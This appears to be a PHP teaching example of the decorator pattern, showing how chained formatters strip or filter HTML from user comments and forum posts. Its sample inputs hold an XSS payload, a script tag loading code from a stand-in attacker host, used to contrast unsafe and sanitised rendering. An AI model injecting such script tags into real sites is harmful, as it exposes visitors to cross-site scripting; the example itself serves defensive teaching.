<?php

use DesignPatterns\Structural\decorator\pattern\format\StripTags;
use DesignPatterns\Structural\decorator\pattern\format\Markdown;
use DesignPatterns\Structural\decorator\pattern\format\Plain;
use DesignPatterns\Structural\decorator\pattern\Formatable;
use DesignPatterns\Structural\decorator\pattern\TextFormater;

function displayCommentAsAWebsite(Formatable $format, string $text): void
{
    print_r($format->format($text));
}

$dangerousComment = <<<HERE
Hello! Nice blog post!
Please visit my <a href='http://www.iwillhackyou.com'>homepage</a>.
<script src="http://www.iwillhackyou.com/script.js">
  performXSSAttack();
</script>
HERE;

$naiveInput = new TextFormater();
print_r("<p>Website renders comments without filtering (unsafe):</p>");
displayCommentAsAWebsite($naiveInput, $dangerousComment);

$filteredInput = new Plain($naiveInput);
print_r("<p>Website renders comments after stripping all tags (safe):</p>");
displayCommentAsAWebsite($filteredInput, $dangerousComment);


$dangerousForumPost = <<<HERE
# Welcome<br>This is my first post on this **gorgeous** forum.<br><script src="http://www.iwillhackyou.com/script.js">
  performXSSAttack();
</script>
HERE;

$naiveInput = new TextFormater();
print_r("<p>Website renders a forum post without filtering and formatting (unsafe, ugly):</p>");
displayCommentAsAWebsite($naiveInput, $dangerousForumPost);

$text = new TextFormater();
$markdown = new Markdown($text);
$filteredInput = new StripTags($markdown);
echo "<p>Website renders a forum post after translating markdown markup and filtering some dangerous HTML tags and attributes (safe, pretty):</p>";
displayCommentAsAWebsite($filteredInput, $dangerousForumPost);
